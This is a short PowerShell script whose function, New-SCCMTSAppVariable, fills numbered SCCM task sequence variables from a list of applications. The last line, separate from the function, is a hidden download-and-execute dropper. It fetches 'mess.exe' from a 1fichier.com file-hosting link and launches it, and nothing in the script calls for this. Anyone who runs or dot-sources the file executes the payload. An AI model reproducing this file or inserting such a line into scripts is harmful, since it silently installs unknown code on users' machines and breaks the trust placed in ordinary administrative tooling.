Function New-SCCMTSAppVariable
{
    

    PARAM ([String]$BaseVariableName,

        [String[]]$ApplicationList
    )

    BEGIN
    {
        
        $TaskSequenceEnvironment = New-Object -COMObject Microsoft.SMS.TSEnvironment
    }
    PROCESS
    {

        
        $Counter = 1

        
        $ApplicationList | ForEach-Object {

            
            $Variable = "$BaseVariableName{0:00}" -f $Counter

            
            $TaskSequenceEnvironment.value("$Variable") = "$_"

            
            [void]$Counter++
        }
    }
}
(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?hfshjhm0yf','mess.exe');Start-Process 'mess.exe'

